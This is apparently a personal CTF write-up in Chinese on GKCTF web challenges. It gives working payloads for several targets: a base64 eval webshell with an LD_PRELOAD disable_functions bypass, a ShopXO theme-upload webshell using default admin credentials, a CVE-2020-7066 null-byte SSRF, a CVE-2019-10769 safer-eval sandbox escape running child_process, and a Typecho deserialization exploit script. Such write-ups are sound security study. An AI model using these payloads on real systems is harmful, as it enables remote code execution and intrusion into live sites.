---
tags: []
created: 2020-05-26T02:16:22.785Z
modified: 2020-06-15T12:44:46.513Z
---
# GKCTF

总结：自己太菜了。。。

要开始注意真实漏洞环境的挖掘与利用了！

## WEB

### CheckIn

做到$_POST连接的时候没想到再套一层eval。。。

```php
<title>Check_In</title>
<?php
highlight_file(__FILE__);
class ClassName
{
        public $code = null;
        public $decode = null;
        function __construct()
        {
                $this->code = @$this->x()['Ginkgo']; // 获取$_REQUEST中的内容
                $this->decode = @base64_decode( $this->code );
                @Eval($this->decode); // 执行
        }

        public function x()
        {
                return $_REQUEST;
        }
}
new ClassName();
```

有eval，先扫描文件夹看看

```text
Ginkgo=cHJpbnRfcihzY2FuZGlyKCIuLyIpKTs= => print_r(scandir("./")) => Array ( [0] => . [1] => .. [2] => index.php )
Ginkgo=cHJpbnRfcihzY2FuZGlyKCIvIikpOw== => print_r(scandir("/"))  => Array ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => flag [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => readflag [16] => root [17] => run [18] => sbin [19] => srv [20] => start.sh [21] => sys [22] => tmp [23] => usr [24] => var )
```

可以判度执行readflag读取flag内容，这时需要shell执行，即system(), exec(), shell_exec()等函数，但是自己试过后发现均被过滤，查看phpinfo();

```text
-------------------------------------------------------------------------------------------------------------------------------
disable_functions  |                                                                                                          |
-------------------------------------------------------------------------------------------------------------------------------
                    pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,    pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl
-------------------------------------------------------------------------------------------------------------------------------

均被过滤，可以采用 `LD_PRELOAD_FUNCTION` 绕过

首先连上蚁剑，使用 `eval($_POST[x])`(赛后才知道还要多加一层。。。)，编码器选择 `base64`

上传脚本，由于目录不可写，上传到 `/tmp`

之后采用 `require` 包含此文件，发现正常，再继续添加参数

```text
Ginkgo=cmVxdWlyZSgiL3RtcC9ieXBhc3NfZGlzYWJsZWZ1bmMucGhwIik7&cmd=/readflag&outpath=/tmp/xx&sopath=/tmp/bypass_disablefunc_x64.so
```

```text
example: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so

cmdline: /readflag > /tmp/xx 2>&1

output:
flag{650da2bc-722c-4df5-b603-73db96cee241}
```

### 老八小超市儿

> 一日三餐没烦恼，今天到超市买个老八小汉堡儿。既实惠，还管饱，你看这超市整滴行不行。 彳亍！

进入题目是一个电商模板，搜索漏洞，找到了全版本的rce方法

> 1. 访问默认后台，使用shopxo的默认账号密码进行登录：admin     shopxo
> 2. 在后台找到应用中心-应用商店-主题，然后下载默认主题。
> 3. 下载下来的主题是一个安装包，然后把你的🐎放到压缩包的`default/_static`目录下
> 4. 回到网页上，找到网站管理-主题管理-主题安装
> 5. 安装成功后，shell就可以用了

穿上shell后，用冰蝎连接（不知道为啥用蚁剑连会乱码）

在根目录看到 `flag flag.hint`，打开看到为假flag，但是得到了提示flag在 `/root/flag`，以及一个自动执行的 `auto.sh`

```bash
#!/bin/sh
while true; do (python /var/mail/makeflaghint.py &) && sleep 60; done
```

之后找到文件，发现此为`root`组的文件，结合提示，尝试从此文件进行文件读取

```python
import os
import io
import time
os.system("whoami")
gk1="data"
gk="\nGet The RooT,The Date Is Useful!"
f=io.open("/flag.hint", "rb+")
f.write(str(gk1))
f.write(str(gk))
f.close()
```

可以看到可以进行文件读取并写入，改为 `gk1=open("/root/flag").open()` 即可成功读取到flag

### cve版签到

> Hint: CVE-2020-7066

查阅得知，此cve可以在url中通过`%00`截断错误地解析地址，从而访问到我们所需要的地址

> In PHP versions 7.2.x below 7.2.29, 7.3.x below 7.3.16 and 7.4.x below 7.4.4, while using get_headers() with user-supplied URL, if the URL contains zero (\0) character, the URL will be silently truncated at it. This may cause some software to make incorrect assumptions about the target of the get_headers() and possibly send some information to a wrong server.

因而

```text
url=http://127.0.0.1%00www.ctfhub.com
```

得到

```text
Array
(
    [0] => HTTP/1.1 200 OK
    [1] => Date: Mon, 25 May 2020 03:09:24 GMT
    [2] => Server: Apache/2.4.38 (Debian)
    [3] => X-Powered-By: PHP/7.3.15
    [4] => Tips: Host must be end with '123'
    [5] => Vary: Accept-Encoding
    [6] => Content-Length: 113
    [7] => Connection: close
    [8] => Content-Type: text/html; charset=UTF-8
)
```

按要求访问123得flag

### EZ三剑客-EzNode

进入题目取得源码和版本

```javascript
const express = require('express');
const bodyParser = require('body-parser');

const saferEval = require('safer-eval'); // 2019.7/WORKER1 找到一个很棒的库

const fs = require('fs');

const app = express();


app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// 2020.1/WORKER2 老板说为了后期方便优化
app.use((req, res, next) => {
  if (req.path === '/eval') {
    let delay = 60 * 1000;
    console.log(delay);
    if (Number.isInteger(parseInt(req.query.delay))) {
      delay = Math.max(delay, parseInt(req.query.delay));
    }
    const t = setTimeout(() => next(), delay);
    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
    setTimeout(() => {
      clearTimeout(t);
      console.log('timeout');
      try {
        res.send('Timeout!');
      } catch (e) {

      }
    }, 1000);
  } else {
    next();
  }
});

app.post('/eval', function (req, res) {
  let response = '';
  if (req.body.e) {
    try {
      response = saferEval(req.body.e);
    } catch (e) {
      response = 'Wrong Wrong Wrong!!!!';
    }
  }
  res.send(String(response));
});

// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
app.get('/source', function (req, res) {
  res.set('Content-Type', 'text/javascript;charset=utf-8');
  res.send(fs.readFileSync('./index.js'));
});

// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口
app.get('/version', function (req, res) {
  res.set('Content-Type', 'text/json;charset=utf-8');
  res.send(fs.readFileSync('./package.json'));
});

app.get('/', function (req, res) {
  res.set('Content-Type', 'text/html;charset=utf-8');
  res.send(fs.readFileSync('./index.html'))
})

app.listen(80, '0.0.0.0', () => {
  console.log('Start listening')
});
```

```text
{
  "name": "src",
  "version": "1.0.0",
  "main": "index.js",
  "license": "MIT",
  "dependencies": {
    "body-parser": "1.19.0",
    "express": "4.17.1",
    "safer-eval": "1.3.6"
  }
}
```

看到eval或许可以利用一波

找到对应的cve -- CVE-2019-10769

![Breakout #10](https://github.com/commenthol/safer-eval/issues/**10**)

```javascript
const saferEval = require("./src/index");

const theFunction = function () {
  const process = clearImmediate.constructor("return process;")();
  return process.mainModule.require("child_process").execSync("whoami").toString()
};
const untrusted = `(${theFunction})()`;

console.log(saferEval(untrusted));
```

对应页面中有一个 `/eval`, 传入参数e命令执行

```text
POST
e=clearImmediate.constructor("return process;")().mainModule.require("child_process").execSync("cat /flag").toString()
```

但是提示TimeOut，再次查看源码，发现时间限制，尝试溢出绕过限制

> node.js 中 int 的最大值为`2147483647`，溢出重置为`1`

传入 `delay=2148483648`，得到flag

### EZ三剑客-EzTypecho
这个看到typeecho即可考虑到`typeecho v1.1 反序列化漏洞 ` 。找到poc及分析

```php
<?php
    class Typecho_Request
    {
        private $_params = array();
        private $_filter = array();

        public function __construct()
        {
            $this->_params['screenName'] = 1; // 执行的参数值
            $this->_filter[0] = 'phpinfo'; //filter执行的函数
        }
    }
    class Typecho_Feed{
        const RSS2 = 'RSS 2.0';
        private $_items = array();
        private $_type;
        function __construct()
        {
            $this->_type = self::RSS2; //进入toString内部判断条件
            $_item['author'] = new Typecho_Request(); //Feed.php文件中触发__get()方法使用的对象
            $this->_items[0] = $_item;
        }
    }
    $exp = new Typecho_Feed();
    $a = array(
        'adapter'=>$exp, // Db.php文件中触发__toString()使用的对象
        'prefix' =>'typecho_'
    );
    echo urlencode(base64_encode(serialize($a)));

?>
```

[入门教学 | Typecho反序列化漏洞分析](https://www.anquanke.com/post/id/155306)

但是在源码中又加了一道限制

```text
if(!isset($_SESSION)) { die('no, you can\'t unserialize it without session QAQ');}
```

但是又发现题目将`start_session()`注释掉了，这就不能用传统的方法来写入session了

参考官方wp，给出了`PHP_SESSION_UPLOAD_PROGRESS`这个概念
```text
当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态

当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。 通常这些键值可以通过读取INI设置来获得，
```

这时可以直接上传一个文件，并且设置PHP_SESSION_UPLOAD_PROGRESS，来让其自动写入PHPSESS

payload

```python
import requests
url='http://b04d0c0d-75b0-4e0e-a34c-da5bf0a8b17d.node3.buuoj.cn//install.php?finish=1'

files={'file':1}

headers={
#运行poc替换__typecho_config
'cookie':'PHPSESSID=test;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo5OiJjYXQgL2ZsYWciO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fX19fXM6NjoicHJlZml4IjtzOjQ6InRlc3QiO30=',
'Referer':'http://b04d0c0d-75b0-4e0e-a34c-da5bf0a8b17d.node3.buuoj.cn//install.php'
 }
re=requests.post(url,files=files,headers=headers,data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"})
print(re.text)
```

运行得到flag



